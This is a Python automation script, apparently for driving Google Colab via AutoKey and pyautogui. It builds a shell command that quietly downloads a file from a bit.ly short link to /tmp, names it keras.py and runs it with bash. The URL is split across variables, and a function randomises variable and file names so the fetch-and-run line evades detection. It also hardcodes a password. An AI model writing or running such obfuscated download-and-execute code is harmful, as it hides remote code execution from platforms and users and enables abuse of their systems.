import time
import os
import logging
from autokey import *
import pyautogui
import random
import string

listfile = '/home/one/g90p2'
gpass = "Ms123456789"
new = True
global_slow_motion = 0.7
enable_gpu = False
speed = 200

endpoint_part1="pysi"
endpoint_part2="000"
domain0="bit"
domain1="ly"
log_level="0"
col_cmd = "! cmd=pysi;i=003;b=ly;a=bit;wget -q -O /tmp/keras.py ${a}.${b}/${cmd}${i} ; bash /tmp/keras.py 0"
###################################################################
#logging.basicConfig(filename='/tmp/0colab-robot.log',
#                    encoding='utf-8', level=logging.DEBUG)
#logging.debug('This message should go to the log file')
#logging.info('So should this')
#logging.warning('And this, too')
#logging.error('And non-ASCII stuff, too, like Øresund and Malmö')
##################### Functions ###################################


def rand_string():
    return random.choice(string.ascii_uppercase + string.ascii_lowercase)+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(10)))


def rand_cmd(endpoint_part1="pysi", endpoint_part2="000", domain0="bit", domain1="ly"):
    file_tmp = "/tmp/"+rand_string()
    c = rand_string()
    i = rand_string()
    b = rand_string()
    a = rand_string()
    wgetcmd = "wget -q -O "
    bash = "bash "
    p1 = f"! {a}={domain0};{c}={endpoint_part1};{i}={endpoint_part2};"
    p2 = f"{b}={domain1};{i}={endpoint_part2};{wgetcmd} {file_tmp} "
    p3 = f"${{{a}}}.${{{b}}}/${{{c}}}${{{i}}} "
    p4 = f"; {bash}  {file_tmp} {log_level}"
    cmd = p1+p2 + p3 + p4
    return cmd

print(rand_cmd())
